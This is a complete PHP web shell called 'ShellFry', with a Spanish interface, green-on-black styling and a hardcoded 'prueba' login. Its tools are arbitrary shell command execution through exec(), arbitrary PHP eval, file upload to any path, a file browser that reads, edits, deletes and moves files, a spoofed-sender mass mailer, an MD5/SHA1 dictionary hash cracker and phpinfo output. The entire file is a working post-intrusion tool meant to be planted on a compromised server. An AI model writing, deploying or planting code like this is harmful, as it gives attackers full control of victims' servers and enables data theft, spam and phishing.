<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php
session_start();


if(isset($_POST["submitlo"])){
	$_SESSION['logueado'] = 0;
	$pass = $_POST["contras"];
	$user = $_POST["usuario"];
	if($user=="prueba"){
		if($pass=="prueba"){
			$_SESSION['logueado'] = 1;
		}
		else{echo"<script>alert('Contraseña o Nombre de usuario incorrecto');</script>";}
	}
	else{echo"<script>alert('Contraseña o Nombre de usuario incorrecto');</script>";}
}

if($_SESSION['logueado']==1){

?>
	<head><title>ShellFry</title>
	<meta http-equiv="Content-Type" content="text/html; charset=ascii">
	<style type="text/css">
		<!--
		body {
			background-color: #000000;
		}
		.Estilo12 {color: #00FF00; font-size: 14px; }
		.Estilo18 {color: #00FF00; font-size: 14px; background:#000000;border-color:#00FF00;}
		.Estilo14 {color: #009900}
		-->
    </style></head>
		<body>
		  <?php
			echo <<<_HTML_
<center><pre><font color="#00FF00">
#############################
#############################
####------Friky-X13------####
####------ShellFry-------####
####------V1.0-Beta------####
####------<font color="Red">FryProject</font>-----####
#############################
#############################
<font></pre></center>                                                            
_HTML_
		?>
		</p>
		<center>
		<table width="782" height="78" border="1" bordercolor="00FF00">
          <tr>
            <td width="70" height="23"><span class="Estilo12">Systema:</span></td>
            <td width="275"><span class="Estilo12"><?php echo php_uname('s') . php_uname('r')." ".php_uname('v'); ?>&nbsp;</td>
            <td width="143"><span class="Estilo12">Directorio Actual:</span></td>
            <td width="296"><span class="Estilo12"><?php echo getcwd(); ?></span></td>
          </tr>
          <tr>
            <td height="22"><span class="Estilo12">IP:</span></td>
            <td><span class="Estilo12"><?php echo $_SERVER['SERVER_ADDR'] ?></span></td>
            <td><span class="Estilo12">Version PHP: </span></td>
            <td><span class="Estilo12"><?php echo phpversion() ?></span></td>
          </tr>
          <tr>
            <td height="23"><span class="Estilo12">User:</span></td>
            <td><span class="Estilo12"><?php echo "uid=" . getmyuid() . " (" . get_current_user() . ") gid=" . getmygid() ?>
            </span></td>
            <td><span class="Estilo12">Servidor:</span></td>
            <td><span class="Estilo12"><?php echo $_SERVER['SERVER_SOFTWARE']?><span></span></td>
          </tr>
        </table>
		</center>
		  <p>
	    
		  <fieldset class="Estilo18">
			<center>
		    <table width="761" height="45" border="0">
              <tr>
                <td width="100"><span class="Estilo12"><a href="?SuAr=">[*Subir Archivo],</a></span></td>
                <td width="100"><span class="Estilo12"><a href="?Mail=">[*Mailer],</a></span></td>
                <td width="100"><span class="Estilo12"><a href="?ECMD=">[*Ejecutar Comando Bash], </a></span></td>
                <td width="100"><span class="Estilo12"><a href="?ExAr=">[*Explorador de Archivos],</a></span></td>
				<td width="100"><span class="Estilo12"><a href="?EPHP=">[*Ejecutar Codigo PHP], </a></span></td>
              	<td width="100"><span class="Estilo12"><a href="?HaCr=">[*Hash Cracker], </a></span></td>
                <td width="100"><span class="Estilo12"><a href="?HaTe=">[*Codificar Texto], </a></span></td>
				<td width="100"><span class="Estilo12"><a href="?Ba64=">[*Base64], </a></span></td>
                <td width="100"><span class="Estilo12"><a href="?PHPi=">[*PHPInfo], </a></span></td>
                <td width="100"><span class="Estilo12"><a href="?GePaA=">[*Generar Contraseña Aleatoria]. </a></span></td>
                <td width="100"><span class="Estilo12"><a href="?CeSeT=">[*Cerrar Sesion de Trabajo]. </a></span></td>
              </tr>
            </table>
			</center>
	    </fieldset>
		   </p>

            <p>
              <?php		  	

//--------------------------------------------------Subir Archivo--------------------------------------------------
if(isset($_GET["SuAr"])){
		echo'
		<form name="form1" enctype="multipart/form-data" method="post" action="#">
		  <table width="418" height="113" border="0">
            <tr>
              <td width="102"><span class="Estilo12">Directorio:</span></td>
              <td width="306"><input type=text name=destino value="' .getcwd(). '"></td>
            </tr>
            <tr>
              <td><span class="Estilo12">Archivo:</span></td>
              <td><input type="file" name="archi"></td>
            </tr>
            <tr>
              <td>&nbsp;</td>
              <td><input type="submit" name="Submit" value="Subir"></td>
            </tr>
          </table>
	    </form>
		';
	if (isset($_POST["Submit"])){
		
		if((isset($_FILES["archi"])) || (empty($_FILES["archi"])))
		{
			$archivo = basename($_FILES["archi"]["name"]);
			if (move_uploaded_file($_FILES['archi']['tmp_name'], $archivo)) {
                if (copy($archivo, $_POST['destino'] . "/" . $archivo)) {
                    unlink($archivo);
                    echo "<script>alert('Subido con exito');</script>";
            	}
				else{echo "<script>alert('Subido con exito');</script>";}
			}
			else{echo "<script>alert('Selecciona el archivo');</script>";}
		}
		else{echo "<script>alert('Selecciona el archivo');</script>";}
	}

}
//--------------------------------------MailerFry------------------------------------

if(isset($_GET["Mail"])){
	echo '<form action="#" method="post" enctype="multipart/form-data" name="form3">
		  <table width="486" height="337" border="1">
            <tr>
              <td width="153"><span class="Estilo12">Correo Remitente:</span></td>
              <td width="317"><input type="text" name="core" value="correo_remitente@hotmail.com"></td>
            </tr>
            <tr>
              <td width="153"><span class="Estilo12">Correo Falso:</span></td>
              <td width="317"><input type="text" name="cofa" value="correo_falso@falmail.com"></td>
            </tr>
            <tr>
              <td><span class="Estilo12">Lista de Correos:</span></td>
              <td><input type="text" name="lista"><span class="Estilo12"> Es nesesario que la lista de correos este en el servidor.</span></td>
            </tr>
            <tr>
              <td><span class="Estilo12">Asunto:</span></td>
              <td><input type="text" name="asunto"></td>
            </tr>
            <tr>
              <td><span class="Estilo12">Nombre Remitente</span></td>
              <td><input type="text" name="nore" value="Friky"></td>
            </tr>
            <tr>
              <td><span class="Estilo12">Veces a Enviar a cada correo</span></td>
              <td><input type="text" name="vecc" value="1"></td>
            </tr>
            <tr>
              <td height="75"><span class="Estilo12">Contenido</span></td>
              <td><textarea name="contenido" cols="50" rows="10"></textarea></td>
            </tr>
            <tr>
              <td height="48">&nbsp;</td>
              <td><input type="submit" name="Submit" value="Enviar Mensajes"></td>
            </tr>
          </table>
		  <p>
		            
        </form>';
		
	if (isset($_POST["Submit"])){

		$cont.= "MIME-Version: 1.0\n";
        $cont.= "Content-type: text/html ; charset=iso-8859-1\n";
        $cont.= "MIME-Version: 1.0\n";
        $cont.= "From: " . $_POST['nore'] . " <" . $_POST['cofa'] . ">\n";
        $cont.= "To: " . $_POST['nore'] . "<" . $_POST['cofa'] . ">\n";
        $cont.= "Reply-To:" . $_POST['cofa'] . "\n";
        $cont.= "X-Priority: 1\n";
        $cont.= "X-MSMail-Priority:Hight\n";
        $cont.= "X-Mailer:Widgets.com Server";


        for ($i = 1;$i <= $_POST['vecc'];$i++) {
            if ($_POST['lista'] != "None") {
                $open = fopen($_POST['lista'], "r");
                while (!feof($open)) {
                    $word = fgets($open, 255);
                    $word = chop($word);
                    if (@mail($word, $_POST['asunto'], $_POST['contenido'], $cont)) {
                        echo "[+] Mensaje <b>$i</b> a <b>" . $word . "</b> Enviado<br>";
                        flush();
                    } 
                    else {
                        echo "[+] Mensaje <b>$i</b> a <b>" . $word . "</b> No Fue Enviado<br>";
                    }
                }
            } 
            else {
                if (@mail($_POST['core'], $_POST['asunto'], $_POST['contenido'], $cont)) {
                    echo "[+] Mensaje <b>$i</b> a <b>" . $_POST['core'] . "</b> Enviado<br>";
                    flush();
                } else {
                    echo "[+] Mensaje <b>$i</b> a <b>" . $_POST['core'] . "</b> No Fue Enviado<br>";
                }
            }
        }
		
	}
}
//-------------------------------------------Ejecutador de comandos del Cmd---------------------------------------------
if(isset($_GET["ECMD"])){
		echo'<form name="form1" method="post" action="">
					<p><span class="Estilo12">Comando:</span> 
					  <input type="text" name="comando">
					</p>
					<p>
					  <input type="submit" name="Submit" value="Ejecutar Comando">
					</p>
				  </form>';
	if(isset($_POST["Submit"])){
		if(isset($_POST["comando"])){
			exec($_POST["comando"],$salida); 
			 echo "<table width='500' border='4' bordercolor='#00FF00'><tr>
  			 <td><span class='Estilo12'>";
			foreach($salida as $line) {echo $line."<br>"; 
		}
			echo"</span></td></tr></table>";
		}
	}
}
//--------------------------------------------------Explorador de Archivos--------------------------------------------------
if(isset($_GET["ExAr"]))
{
	echo'<form name="form1" enctype="multipart/form-data" method="get" action="#">
		<input type=text name=direc value="' .getcwd(). '">
		<td>
		<input type="submit" name="Submitdi" value="Abrir Directorio">
		</form>
';
}
if(isset($_GET["Submitdi"])){
	$diree = $_GET["direc"]."/";
	if(is_dir($diree)){
		$diir=opendir($diree);
		echo'<form name="form1" enctype="multipart/form-data" method="get" action="#">
		<input type=text name=direc value="' .$diree. '">
		<td>
		<input type="submit" name="Submitdi" value="Abrir Directorio">
		</form>';

		echo "<span class='Estilo12'><h1>Directorio: ".$diree."</h1></span><br>
		<form name='form1' enctype='multipart/form-data' method='post' action='?cdi=".$diree."'>	
			<input type=text name=cdii><input type='submit' name='CDiii' value='Crear Directorio'>
		</form>
		<form name='form1' enctype='multipart/form-data' method='post' action='?cfi=".$diree."'>
			<input type=text name=cfii><input type='submit' name='CF' value='Crear Fichero'>
		</form>
		";
		
		echo'<table width="777" border="4">
			  <tr>
				<td width="159" height="55"><span class="Estilo12">Nombre del Archivo:</span></td>
				<td width="128"><span class="Estilo12">Tipo de Archivo:</span></td>
				<td width="162"><p class="Estilo12">Fecha de la ultima </p>
				<p class="Estilo12">modificacion del archivo:</p></td>
				<td width="133"><span class="Estilo12">Es un Ejecutable:</span></td>
				<td width="133"><span class="Estilo12">Descargar:</span></td>
				<td width="133"><span class="Estilo12">Borrar:</span></td>
				<td width="133"><span class="Estilo12">Copiar:</span></td>
				<td width="133"><span class="Estilo12">Mover:</span></td>
			  </tr>
		';
		while (($item = readdir($diir))  !== false){

				$NomDic = $diree."/".$item;
				$tiempo = filemtime($NomDic);
				
				if (is_dir($diree."/".$item)==true){
					echo "<tr><td width='159' height='55'><span class='Estilo12'>
					<a href=http://localhost/shellFry/?abrirdir=".$NomDic.">".$item."</a></span></td> 
					<td width='128'><span class='Estilo12'>Es un Directorio:</span></td>
					<td width='162'><p class='Estilo12'>".$tiempo."</p></td>
					<td width='133'><span class='Estilo12'>NO</span></td>";
					echo'<td width="133"><span class="Estilo12">No Disponible.</span></td>';
					echo'<td width="133"><span class="Estilo12"><a href="?borraar='.$NomDic.'&dir='.$diree.'">Borrar.</a></span></td>';
					echo'<td width="133"><span class="Estilo12"><a href="?copiaar='.$NomDic.'&dir='.$diree.'">Copiar.</a></span></td>';
					echo'<td width="133"><span class="Estilo12"><a href="?moveer='.$NomDic.'&dir='.$diree.'">Mover.</a></span></td></tr>';
				}
				else{echo "<tr><td width='159' height='55'><span class='Estilo12'>
					<a 	href=http://localhost/shellFry/?abrir=".$NomDic.">".$item."</a></span></td> 
					<td width='128'><span class='Estilo12'>Es un Fichero</span></td>
					<td width='162'><p class='Estilo12'>".$tiempo."</p></td>";
					if(is_executable($NomDic)==true){echo "<td width='133'><span class='Estilo12'>Si</span></td>";
						echo'<td width="133"><span class="Estilo12"><a href="?descargarr='.$NomDic.'">Descargar</a></span></td></tr>';
					}
					
					else{echo "<td width='133'><span class='Estilo12'>NO</span></td>";
						echo'<td width="133"><span class="Estilo12"><a href="?descargarr='.$NomDic.'&dir='.$diree.'">Descargar</a></span></td>';
					}
					echo'<td width="133"><span class="Estilo12"><a href="?borraar='.$NomDic.'&dir='.$diree.'">Borrar.</a></span></td>';
					echo'<td width="133"><span class="Estilo12"><a href="?copiaar='.$NomDic.'&dir='.$diree.'">Copiar.</a></span></td>';
					echo'<td width="133"><span class="Estilo12"><a href="?moveer='.$NomDic.'&dir='.$diree.'">Mover.</a></span></td></tr>';
				}
	
		}
		echo"</table>";
		
	}
	else{echo"<script>alert('Por Favor selecciona un Directorio, No un Frichero');</script>";}
}


if (isset($_GET["cdi"])){
		if(isset($_POST["cdii"])){
			if(empty($_POST["cdii"])){header("Refresh:0;?direc=".$_GET["cdi"]."&Submitdi=Abrir+Directorio#");echo"<script>alert('No especificaste un nombre');</script>";}
			else{
				mkdir($_GET["cdi"].$_POST["cdii"],777);
				echo"<script>alert('Directorio Creado');</script>";
				header("Refresh:0;?direc=".$_GET["cdi"]."&Submitdi=Abrir+Directorio#");
			}
		}		
}
if (isset($_GET["cfi"])){
	if(isset($_POST["cfii"])){
		if(empty($_POST["cfii"])){header("Refresh:0;?direc=".$_GET["cfi"]."&Submitdi=Abrir+Directorio#");echo"<script>alert('No especificaste un nombre');</script>";}
		else{
			$cf = fopen($_GET["cfi"].$_POST["cfii"],"w");
			fclose($cf);
			echo"<script>alert('Fichero Creado');</script>";
			header("Refresh:0;?direc=".$_GET["cfi"]."&Submitdi=Abrir+Directorio#");
		}
	}
}
if(isset($_GET["abrirdir"])){

	$_GET["Submitdi"]="";
	$abd=$_GET["abrirdir"];
	header("Location:?direc=".$abd."&Submitdi=Abrir+Directorio#");
}

if(isset($_GET["abrir"])){

	$abrirleer = file($_GET["abrir"]);

	echo"<form name='form1' enctype='multipart/form-data' method='post' action='?guardar=".$_GET["abrir"]."'>
		<textarea name='contenido' class='Estilo18' cols='100' rows='20'>";
        foreach($abrirleer as $n => $txt) {
            $texto = htmlspecialchars($txt);
            echo $texto;
		}
		echo"</textarea><br>
		<input type='submit' name='CF' value='Guardar'>
		</form>";
}
if (isset($_GET["guardar"])){
	if($_POST["contenido"]){
		$guard = fopen($_GET["guardar"],"w");
		fwrite($guard, $_POST["contenido"]);
		fclose($guard);
		echo"<script>alert('Se guardo con exito.')</script>";
		header("Refresh:0;http://localhost/shellFry/?ExAr=");
	}	
}
if (isset($_GET["descargarr"])){
	$file = $_GET["descargarr"];
	header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=" . basename($file));
    readfile($_GET['down']);
    exit(0);
}
if (isset($_GET["borraar"])){

	echo"<form action='' method='post'>
	<input type='Submit' name='submitb' value='Estoy Seguro de Borrar'>
	<input type='Submit' name='submitca' value='Cancelar'>
	</form>
	";
	if(isset($_POST["submitb"])){
		$archiaborr = $_GET["borraar"];

		if(is_dir($archiaborr)==true){
			rmdir($archiaborr);
			echo"<script>alert('Directorio Borrado');</script>";
			header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
		}
		else{
			unlink($archiaborr);
			echo"<script>alert('Fichero Borrado');</script>";
			header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
		}
	}


	if(isset($_POST["submitca"])){
		$archiaborr = $_GET["borraar"];
			header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
		
		
	}


}
if(isset($_GET["copiaar"])){
	echo"
<form name='copiar' method='post' action='?copiaar2='>
Archivo a Copiar: <input type='text' name='dee' value='".$_GET["copiaar"]."'><br>
Archivo Nuevo: <input type='text' name='aaa' value='".$_GET["copiaar"]."'><br>
<input type='submit' value='Copiar' name='submitc'>
</form>
";

}
if(isset($_GET["copiaar2"])){
	if( (!isset($_POST["aaa"])) || (!isset($_POST["dee"])) ){
		echo"<script>alert('Por favor llena los dos campos.');</script>";
		header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
	}
	else{
		copy($_POST['dee'], $_POST['aaa']);
		echo"<script>alert('Copiado.');</script>";
		header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
	}

}

if(isset($_GET["moveer"])){
	echo"
<form name='copiar' method='post' action='?moveer2='>
Archivo a Mover: <input type='text' name='dee' value='".$_GET["moveer"]."'><br>
Archivo Nuevo: <input type='text' name='aaa' value='".$_GET["moveer"]."'><br>
<input type='submit' value='Mover' name='submitc'>
</form>
";

}
if(isset($_GET["moveer2"])){
	if( (!isset($_POST["aaa"])) || (!isset($_POST["dee"])) ){
		echo"<script>alert('Por favor llena los dos campos.');</script>";
		header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
	}
	else{
		rename($_POST['dee'], $_POST['aaa']);
		echo"<script>alert('Movido.');</script>";
		header("Refresh:0;?direc=".$_GET["dir"]."&Submitdi=Abrir+Directorio#");
	}

}
//--------------------------------------------------------------------Ejecutar codigo PHP--------------------------------------------------------------------
if (isset($_GET["EPHP"])){
	echo"
<form method='post' action=''>
	Codigo PHP:<br>
	<textarea class='Estilo18' cols='30' rows='5' name='codigo'></textarea><br><input type='submit' name='Submit' value='Ejecutar Codigo PHP'>
	
</form>";
	if(isset($_POST["Submit"])){
		if(isset($_POST["codigo"])){
			echo"Codigo:<br><fieldset class='Estilo18'>";
			echo $_POST["codigo"];
			echo"</fieldset>";
			echo"<br>Resultado:<br><fieldset class='Estilo18'>";
			eval($_POST["codigo"]);
			echo("</fieldset>");
		}
	}
}
//--------------------------------------------------------------------Hash Cracker--------------------------------------------------------------------
if(isset($_GET["HaCr"])){
	echo"<form method='post' action=''>
	<span ='Estilo18'>Hash: </span><input type='text' name='hash'>
	<span ='Estilo18'><br><br>Directorio con la <br>lista de palabras: <input type='text' name='lipa'> Tiene que estar alojado en el servidor</span>
	<span ='Estilo18'><br><br>Selecciona el tipo de Hash: </span>
	<select name='tihash' class='Estilo18'>
		<option value='sha1'>SHA1</option>
		<option value='md5'>MD5</option>
    </select>
    <br><br>
    <input type='submit' name='Submith' value='Iniciar el crackeo'>
	</form>
	";
	if(isset($_POST["Submith"])){

		$open = fopen($_POST["lipa"],"r");
		$contar = 0;
		$desifrado = false;
		while (!feof($open)) {
            $word = fgets($open, 255);
            $linea = chop($word);

            $texto = $linea;
            $txt = preg_split("/\n/", $texto);
            if($_POST["tihash"]=="sha1"){
            	$hashd = sha1($texto);
            	if($hashd == $_POST["hash"]){
            		echo "<span ='Estilo18'>[+] La palabra desifrada es: <font color='red'>".$texto."'</font><br></span>";
            		$desifrado = true;
            		break;
            	}
            	else{echo "<span ='Estilo18'>[-] La palabra no es: <font color='blue'>'".$texto."'</font><br></span>";}
            }
            else{
            	$hashd = md5($texto);
            	if($hashd == $_POST["hash"]){
            		echo "<span ='Estilo18'>[+] La palabra desifrada es: <font color='red'>'".$texto."'</font><br></span>";
            		$desifrado = true;
            		break;
            	}
            	else{echo "<span ='Estilo18'>[-] La palabra no es: <font color='blue'>'".$texto."'</font><br></span>";}
			}
		}
		if($desifrado==true){echo"<script>alert('Desifrado');</script>";}
		else{echo"<script>alert('No se encrontro la palabra del hash');</script>";}
	}
}
//--------------------------------------Hash Generador--------------------------------------
if(isset($_GET["HaTe"])){
	echo"<form action='' method='post'>
	<span ='Estilo18'><br>Texto: <input type='text' name='textt'></span>
	<select name='cohash' class='Estilo18'>
		<option value='sha1'>SHA1</option>
		<option value='md5'>MD5</option>
    </select>
    <br><br>
    <input type='submit' name='Submitco' value='Codificar'>
	</form>
	";
	if(isset($_POST["Submitco"])){
		if($_POST["cohash"]=="md5"){
			$hashcodi = md5($_POST["textt"]);
			echo"<fieldset class='Estilo18'>Texto: ".$_POST["textt"]."<br>Hash: ".$hashcodi."</fieldset>";
		}
		else{
			$hashcodi = sha1($_POST["textt"]);
			echo"<fieldset class='Estilo18'>Texto: ".$_POST["textt"]."<br>Hash: ".$hashcodi."</fieldset>";		
		}
	}
}
//--------------------------------------base64--------------------------------------
if(isset($_GET["Ba64"])){
	echo"<form action='' method='post'>
	<span='Estilo18'>Codificar:<input type='text' name='codifytext'></span><input type='submit' name='Submitcob' value='Codificar'>
	</form>
	<form action='' method='post'>
	<span='Estilo18'>Decodificar:<input type='text' name='decodifytext'></span><input type='submit' name='Submitde' value='Decodificar'>
	</form>
	";
	if(isset($_POST["Submitcob"])){
		$txtcode = base64_encode($_POST["codifytext"]);
		echo"<fieldset class='Estilo18'>Texto: ".$_POST["codifytext"]."<br>Texto Codificado Base64: ".$txtcode;
	}
	
	elseif(isset($_POST["Submitde"])){
		$txtcode = base64_decode($_POST["decodifytext"]);
		echo"<fieldset class='Estilo18'>Texto: ".$txtcode."<br>Texto Codificado Base64: ".$_POST["decodifytext"];
	}
	
}
//--------------------------------------PHP informacion--------------------------------------
if(isset($_GET["PHPi"])){
	die(phpinfo());
}
//--------------------------------------Generador de Contra--------------------------------------
if(isset($_GET["GePaA"])){
	echo"<form action='' method='post'>
	<span class= 'Estilo18'>Numero de caracteres: </span><input type='text' value='1' name='num'>
	<input type='submit' value='Generar' name='submit'>
	</form>
	";
	if(isset($_POST["submit"])){
		$charset = "abcdefghijklmnopqrstuvwxy1234567890";
		$password = "";
		for($i=0;$i<$_POST["num"];$i++)
		{ 
			$rand = rand() % strlen($charset);
			$password .= substr($charset,$rand,1);
		}
		echo"<span class='Estilo18'>Contraseña Generada: <br>".$password."</span>";
	}
}
if(isset($_GET["CeSeT"])){
	session_destroy();
	session_start();
	$_SESSION["logueado"]=0;
}
?>

<center><br>[FryPoject] 2015. Friky-X13<br>Miguel Angel Mendez Flores<br></center>
</html>



<?php
}
else{$_SESSION["logueado"]=0;
echo"<form action='' method='post'>
	Usuario: <input type ='text' name='usuario'>
	Contraseña: <input type ='password' name='contras'>
	<input type='submit' name='submitlo' value='Inciar'>
	</form>
";}
?>
